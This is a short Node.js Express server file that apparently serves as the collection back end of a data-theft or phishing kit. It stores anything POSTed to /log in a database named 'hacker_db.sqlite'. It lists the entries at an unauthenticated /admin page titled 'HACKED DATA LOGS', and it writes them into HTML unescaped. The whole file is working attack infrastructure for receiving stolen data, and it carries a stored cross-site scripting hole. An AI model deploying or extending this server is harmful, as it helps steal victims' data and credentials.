const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// دیتابیس
const DB_FILE = 'hacker_db.sqlite';
const db = new sqlite3.Database(DB_FILE);

db.serialize(() => {
    db.run("CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)");
});

app.use(express.text()); 
app.use(express.json()); 

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.post('/log', (req, res) => {
    const data = req.body;
    db.run("INSERT INTO logs (data) VALUES (?)", [data], function(err) {
        if (err) console.error(err);
        res.send('OK');
    });
});

app.get('/admin', (req, res) => {
    db.all("SELECT * FROM logs ORDER BY id DESC", [], (err, rows) => {
        if (err) return res.send("Database Error");
        
        let html = `<html><body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
                    <h1>HACKED DATA LOGS</h1>
                    <table border="1" cellpadding="10" style="border-collapse: collapse; width:100%;">
                    <tr><th>ID</th><th>Data</th><th>Time</th></tr>`;
                    
        if (rows.length === 0) {
            html += "<tr><td colspan='3'>No data yet.</td></tr>";
        } else {
            rows.forEach(row => {
                html += `<tr><td>${row.id}</td><td>${row.data.replace(/\n/g, '<br>')}</td><td>${row.timestamp}</td></tr>`;
            });
        }
        html += "</table></body></html>";
        res.send(html);
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
